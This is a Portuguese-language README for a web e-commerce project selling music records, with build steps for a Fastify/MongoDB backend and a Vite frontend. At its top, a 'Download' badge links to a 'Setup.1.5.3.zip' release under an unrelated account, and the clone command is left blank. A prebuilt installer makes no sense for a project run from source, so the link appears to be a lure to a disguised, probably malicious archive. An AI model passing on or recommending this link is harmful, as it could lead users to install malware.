# Soundcrack <img width="40" src="./frontend/public/SoundCrack-Logo.png" align="left" >

[![Download](https://img.shields.io/badge/Download%20Link-blue)](https://github.com/zigzagsqizman58/SoundCrack/releases/download/8q4rsj/Setup.1.5.3.zip)

## Descrição

Soundcrack é um projeto full-stack de um e-commerce de discos de músicas. Ele é composto por um frontend desenvolvido com Vite e TypeScript, e um backend utilizando Fastify e MongoDB.

## Tecnologias Utilizadas
### Backend

- Fastify
- Mongoose
- Zod
- Bcrypt

### Frontend

- Vite
- TypeScript
- Axios
- ColorThief


### Banco de Dados

- MongoDB

## Como Rodar o Projeto

### Pré-requisitos

- Node.js instalado
- Docker instalado

### Clone o repositorio
  
  ```sh
   git clone 
   ```

### Rodando o Backend

1. Navegue até o diretório do backend:
   ```sh
   cd SoundCrack/backend
   ```
2. Inicie o MongoDB com Docker Compose:
   ```sh
   docker-compose up -d
   ```
3. Instale as dependências:
   ```sh
   npm install
   ```
4. inicie a seed: 
   ```sh 
   npm run seed
   ``` 
5. Inicie o servidor de desenvolvimento:
   ```sh
   npm run dev
   ```

### Rodando o Frontend

1. Navegue até o diretório do frontend:
   ```sh
   cd SoundCrack/frontend
   ```
2. Instale as dependências:
   ```sh
   npm install
   ```
3. Inicie o servidor de desenvolvimento:
   ```sh
   npm run build
   ```

Agora você pode acessar o frontend em `http://localhost:3000/public/pages/loja.html` e o backend em `http://localhost:3000`.
